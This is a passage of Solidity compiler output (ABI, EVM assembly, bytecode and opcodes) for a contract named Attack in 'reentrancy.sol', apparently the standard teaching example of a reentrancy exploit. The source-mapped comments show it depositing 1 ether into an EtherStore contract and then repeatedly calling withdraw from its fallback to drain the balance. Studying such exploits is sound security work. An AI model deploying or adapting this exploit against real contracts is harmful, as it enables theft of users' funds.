{
	"reentrancy.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_etherStoreAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "etherStore",
					"outputs": [
						{
							"internalType": "contract EtherStore",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"reentrancy.sol\":595:1126  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"reentrancy.sol\":655:757  constructor(address _etherStoreAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"reentrancy.sol\":730:748  _etherStoreAddress */\n  dup1\n    /* \"reentrancy.sol\":706:716  etherStore */\n  0x00\n  dup1\n    /* \"reentrancy.sol\":706:749  etherStore = EtherStore(_etherStoreAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"reentrancy.sol\":655:757  constructor(address _etherStoreAddress) {... */\n  pop\n    /* \"reentrancy.sol\":595:1126  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"reentrancy.sol\":595:1126  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"reentrancy.sol\":595:1126  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xacd2e6e5\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"reentrancy.sol\":839:846  1 ether */\n      0x0de0b6b3a7640000\n        /* \"reentrancy.sol\":816:826  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"reentrancy.sol\":808:835  address(etherStore).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"reentrancy.sol\":808:846  address(etherStore).balance >= 1 ether */\n      lt\n        /* \"reentrancy.sol\":804:903  if (address(etherStore).balance >= 1 ether) {... */\n      tag_9\n      jumpi\n        /* \"reentrancy.sol\":863:873  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"reentrancy.sol\":863:882  etherStore.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"reentrancy.sol\":883:890  1 ether */\n      0x0de0b6b3a7640000\n        /* \"reentrancy.sol\":863:891  etherStore.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_14:\n      pop\n      pop\n      pop\n      pop\n        /* \"reentrancy.sol\":804:903  if (address(etherStore).balance >= 1 ether) {... */\n    tag_9:\n        /* \"reentrancy.sol\":595:1126  contract Attack {... */\n      stop\n        /* \"reentrancy.sol\":918:1087  function attack() external payable {... */\n    tag_3:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"reentrancy.sol\":618:646  EtherStore public etherStore */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"reentrancy.sol\":918:1087  function attack() external payable {... */\n    tag_16:\n        /* \"reentrancy.sol\":985:992  1 ether */\n      0x0de0b6b3a7640000\n        /* \"reentrancy.sol\":972:981  msg.value */\n      callvalue\n        /* \"reentrancy.sol\":972:992  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"reentrancy.sol\":964:993  require(msg.value >= 1 ether) */\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n        /* \"reentrancy.sol\":1004:1014  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"reentrancy.sol\":1004:1022  etherStore.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"reentrancy.sol\":1030:1037  1 ether */\n      0x0de0b6b3a7640000\n        /* \"reentrancy.sol\":1004:1040  etherStore.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_26:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"reentrancy.sol\":1051:1061  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"reentrancy.sol\":1051:1070  etherStore.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"reentrancy.sol\":1071:1078  1 ether */\n      0x0de0b6b3a7640000\n        /* \"reentrancy.sol\":1051:1079  etherStore.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_27\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_27:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_28:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n        /* \"reentrancy.sol\":918:1087  function attack() external payable {... */\n      jump\t// out\n        /* \"reentrancy.sol\":618:646  EtherStore public etherStore */\n    tag_19:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:110   */\n    tag_31:\n        /* \"#utility.yul\":70:77   */\n      0x00\n        /* \"#utility.yul\":99:104   */\n      dup2\n        /* \"#utility.yul\":88:104   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:110   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":116:193   */\n    tag_32:\n        /* \"#utility.yul\":153:160   */\n      0x00\n        /* \"#utility.yul\":182:187   */\n      dup2\n        /* \"#utility.yul\":171:187   */\n      swap1\n      pop\n        /* \"#utility.yul\":116:193   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":199:259   */\n    tag_33:\n        /* \"#utility.yul\":227:230   */\n      0x00\n        /* \"#utility.yul\":248:253   */\n      dup2\n        /* \"#utility.yul\":241:253   */\n      swap1\n      pop\n        /* \"#utility.yul\":199:259   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":265:459   */\n    tag_34:\n        /* \"#utility.yul\":341:350   */\n      0x00\n        /* \"#utility.yul\":374:453   */\n      tag_46\n        /* \"#utility.yul\":392:452   */\n      tag_47\n        /* \"#utility.yul\":401:451   */\n      tag_48\n        /* \"#utility.yul\":445:450   */\n      dup5\n        /* \"#utility.yul\":401:451   */\n      tag_31\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":392:452   */\n      tag_33\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":374:453   */\n      tag_32\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":361:453   */\n      swap1\n      pop\n        /* \"#utility.yul\":265:459   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":465:648   */\n    tag_35:\n        /* \"#utility.yul\":578:641   */\n      tag_50\n        /* \"#utility.yul\":635:640   */\n      dup2\n        /* \"#utility.yul\":578:641   */\n      tag_34\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":573:576   */\n      dup3\n        /* \"#utility.yul\":566:642   */\n      mstore\n        /* \"#utility.yul\":465:648   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":654:928   */\n    tag_11:\n        /* \"#utility.yul\":773:777   */\n      0x00\n        /* \"#utility.yul\":811:813   */\n      0x20\n        /* \"#utility.yul\":800:809   */\n      dup3\n        /* \"#utility.yul\":796:814   */\n      add\n        /* \"#utility.yul\":788:814   */\n      swap1\n      pop\n        /* \"#utility.yul\":824:921   */\n      tag_52\n        /* \"#utility.yul\":918:919   */\n      0x00\n        /* \"#utility.yul\":907:916   */\n      dup4\n        /* \"#utility.yul\":903:920   */\n      add\n        /* \"#utility.yul\":894:900   */\n      dup5\n        /* \"#utility.yul\":824:921   */\n      tag_35\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":654:928   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":934:1060   */\n    tag_36:\n        /* \"#utility.yul\":971:978   */\n      0x00\n        /* \"#utility.yul\":1011:1053   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1004:1009   */\n      dup3\n        /* \"#utility.yul\":1000:1054   */\n      and\n        /* \"#utility.yul\":989:1054   */\n      swap1\n      pop\n        /* \"#utility.yul\":934:1060   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1066:1208   */\n    tag_37:\n        /* \"#utility.yul\":1116:1125   */\n      0x00\n        /* \"#utility.yul\":1149:1202   */\n      tag_55\n        /* \"#utility.yul\":1167:1201   */\n      tag_56\n        /* \"#utility.yul\":1176:1200   */\n      tag_57\n        /* \"#utility.yul\":1194:1199   */\n      dup5\n        /* \"#utility.yul\":1176:1200   */\n      tag_36\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1167:1201   */\n      tag_33\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1149:1202   */\n      tag_36\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1136:1202   */\n      swap1\n      pop\n        /* \"#utility.yul\":1066:1208   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1214:1340   */\n    tag_38:\n        /* \"#utility.yul\":1264:1273   */\n      0x00\n        /* \"#utility.yul\":1297:1334   */\n      tag_59\n        /* \"#utility.yul\":1328:1333   */\n      dup3\n        /* \"#utility.yul\":1297:1334   */\n      tag_37\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1284:1334   */\n      swap1\n      pop\n        /* \"#utility.yul\":1214:1340   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1346:1489   */\n    tag_39:\n        /* \"#utility.yul\":1413:1422   */\n      0x00\n        /* \"#utility.yul\":1446:1483   */\n      tag_61\n        /* \"#utility.yul\":1477:1482   */\n      dup3\n        /* \"#utility.yul\":1446:1483   */\n      tag_38\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1433:1483   */\n      swap1\n      pop\n        /* \"#utility.yul\":1346:1489   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1495:1660   */\n    tag_40:\n        /* \"#utility.yul\":1599:1653   */\n      tag_63\n        /* \"#utility.yul\":1647:1652   */\n      dup2\n        /* \"#utility.yul\":1599:1653   */\n      tag_39\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1594:1597   */\n      dup3\n        /* \"#utility.yul\":1587:1654   */\n      mstore\n        /* \"#utility.yul\":1495:1660   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1666:1922   */\n    tag_21:\n        /* \"#utility.yul\":1776:1780   */\n      0x00\n        /* \"#utility.yul\":1814:1816   */\n      0x20\n        /* \"#utility.yul\":1803:1812   */\n      dup3\n        /* \"#utility.yul\":1799:1817   */\n      add\n        /* \"#utility.yul\":1791:1817   */\n      swap1\n      pop\n        /* \"#utility.yul\":1827:1915   */\n      tag_65\n        /* \"#utility.yul\":1912:1913   */\n      0x00\n        /* \"#utility.yul\":1901:1910   */\n      dup4\n        /* \"#utility.yul\":1897:1914   */\n      add\n        /* \"#utility.yul\":1888:1894   */\n      dup5\n        /* \"#utility.yul\":1827:1915   */\n      tag_40\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1666:1922   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207a87219f5e223957d4e89e0b70b9b0934f3144651d387bcfd9641fcb0eef530764736f6c63430008160033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506040516104b63803806104b6833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6103aa8061010c5f395ff3fe60806040526004361061002c575f3560e01c80639e5faafc14610108578063acd2e6e51461011257610033565b3661003357005b670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610106575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100d891906102d1565b5f604051808303815f87803b1580156100ef575f80fd5b505af1158015610101573d5f803e3d5ffd5b505050505b005b61011061013c565b005b34801561011d575f80fd5b50610126610263565b604051610133919061035b565b60405180910390f35b670de0b6b3a7640000341015610150575f80fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101bd575f80fd5b505af11580156101cf573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161023491906102d1565b5f604051808303815f87803b15801561024b575f80fd5b505af115801561025d573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f819050919050565b5f819050919050565b5f819050919050565b5f6102bb6102b66102b184610286565b610298565b61028f565b9050919050565b6102cb816102a1565b82525050565b5f6020820190506102e45f8301846102c2565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61032361031e610319846102ea565b610298565b6102ea565b9050919050565b5f61033482610309565b9050919050565b5f6103458261032a565b9050919050565b6103558161033b565b82525050565b5f60208201905061036e5f83018461034c565b9291505056fea26469706673582212207a87219f5e223957d4e89e0b70b9b0934f3144651d387bcfd9641fcb0eef530764736f6c63430008160033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4B6 CODESIZE SUB DUP1 PUSH2 0x4B6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3AA DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x108 JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x112 JUMPI PUSH2 0x33 JUMP JUMPDEST CALLDATASIZE PUSH2 0x33 JUMPI STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x106 JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD8 SWAP2 SWAP1 PUSH2 0x2D1 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0x110 PUSH2 0x13C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x11D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x126 PUSH2 0x263 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x133 SWAP2 SWAP1 PUSH2 0x35B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x150 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1CF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x234 SWAP2 SWAP1 PUSH2 0x2D1 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x24B JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x25D JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2BB PUSH2 0x2B6 PUSH2 0x2B1 DUP5 PUSH2 0x286 JUMP JUMPDEST PUSH2 0x298 JUMP JUMPDEST PUSH2 0x28F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2CB DUP2 PUSH2 0x2A1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E4 PUSH0 DUP4 ADD DUP5 PUSH2 0x2C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x323 PUSH2 0x31E PUSH2 0x319 DUP5 PUSH2 0x2EA JUMP JUMPDEST PUSH2 0x298 JUMP JUMPDEST PUSH2 0x2EA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x334 DUP3 PUSH2 0x309 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x345 DUP3 PUSH2 0x32A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x355 DUP2 PUSH2 0x33B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x36E PUSH0 DUP4 ADD DUP5 PUSH2 0x34C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH27 0x87219F5E223957D4E89E0B70B9B0934F3144651D387BCFD9641FCB 